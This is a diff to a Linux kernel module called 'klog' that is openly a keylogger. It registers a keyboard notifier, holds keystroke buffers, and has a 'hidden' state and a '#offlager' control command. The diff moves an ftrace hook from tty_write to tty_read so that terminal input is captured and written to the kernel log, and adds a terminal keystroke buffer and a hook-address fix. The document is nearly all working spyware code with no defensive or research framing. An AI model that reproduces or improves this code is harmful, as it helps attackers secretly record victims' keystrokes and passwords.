@@ -15,6 +15,8 @@
 #include <linux/kallsyms.h>
 #include <linux/linkage.h>
 #include <linux/slab.h>
+#include <linux/timer.h>
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hyp");
@@ -55,14 +57,14 @@ static const char *keymap[][2] = {
 
 #define DEVICE_NAME "klog"
 #define SUCCESS 0
+#define USE_FENTRY_OFFSET 0
+
 
 int keylog(struct notifier_block *, unsigned long, void *);
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);
-
-static struct kobject *testhold;
 
 static struct timer_list ftrace_timer;
 
@@ -75,6 +77,7 @@ static int shiftKey = 0;
 struct semaphore sem;
 
 static char keybuf[10000] = {};
+static char tty_keybuf[10000] = {};
 static char *msg_ptr;
 
 static struct file_operations fops = {
@@ -105,6 +108,12 @@ static int ftrace_resolve(struct ftrace_hook *hook) {
 		pr_debug("unresolved symbol: %s\n", hook->name);
 		return -ENOENT;
 	}
+
+#ifdef USE_FENTRY_OFFSET
+	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+#else
+	*((unsigned long*) hook->original) = hook->address;
+#endif
 
 	return 0;
 }
@@ -188,15 +197,26 @@ void remove_hooks(struct ftrace_hook *hooks, size_t count) {
 		remove_hook(&hooks[i]);
 }
 
-static asmlinkage ssize_t (*real_tty_write)(struct file *file, char __user *buf, 
+static asmlinkage ssize_t (*real_tty_read)(struct file *file, char __user *buf, 
 		size_t count, loff_t *ppos);
 
-static asmlinkage ssize_t ftrace_tty_write(struct file *file, char __user *buf,
+static asmlinkage ssize_t ftrace_tty_read(struct file *file, char __user *buf,
 		size_t count, loff_t *ppos) {
 
 	ssize_t ret;
 	
-	pr_info("here we are again on our own\n");
+	if(strlen(buf) > 0) {
+		/*if((strlen(tty_keybuf)) > 9999) {
+			pr_info("buf: %s\n", tty_keybuf);
+			tty_keybuf[0] = '\0';
+		}*/
+		
+		//strncat(tty_keybuf, buf, strlen(buf));
+		pr_info("buf: %s\n", buf);
+	}
+	
+
+	//pr_info("tty bufsize: %d\n", (int)strlen(buf));
 	ret = real_tty_read(file, buf, count, ppos);
 
 	return ret;
@@ -211,7 +231,7 @@ static asmlinkage ssize_t ftrace_tty_write(struct file *file, char __user *buf,
 	}
 
 static struct ftrace_hook tty_hooks[] = {
-	HOOK("tty_write", ftrace_tty_write, &real_tty_write)
+	HOOK("tty_read", ftrace_tty_read, &real_tty_read)
 };
 
 
@@ -278,16 +298,9 @@ static ssize_t device_read(struct file *filp, char __user *buff, size_t len, lof
 
 static ssize_t
 device_write(struct file *filp, const char __user *buff, size_t len, loff_t *off) {
-	//printk("written: %d\n", 5);
-
-	//char *str;
-	//strcpy(str, buff);
-	//int length = strlen(str);
-	//printk(KERN_INFO "write reached");
-
 	char *str = kmalloc(len, GFP_KERNEL);
 	int error_count = copy_from_user(str, buff, len);
-	char *strings = "strangzz";
+	
 	printk(KERN_INFO "writered: %c\n", str[0]);
 	
 	if(strncmp("#offlager", str, 9) == 0) {
@@ -395,10 +408,11 @@ static void kill_ftrace(unsigned long data) {
 }
 
 static int __init init_klog(void) {
-	keybuf[0] = '\0';
-	hidden = 0;
 	int err;
 
+	keybuf[0] = '\0';
+	hidden = 0;
+	
     register_keyboard_notifier(&nb);
     printk(KERN_INFO "Registering keylager\n");
     sema_init(&sem, 1);
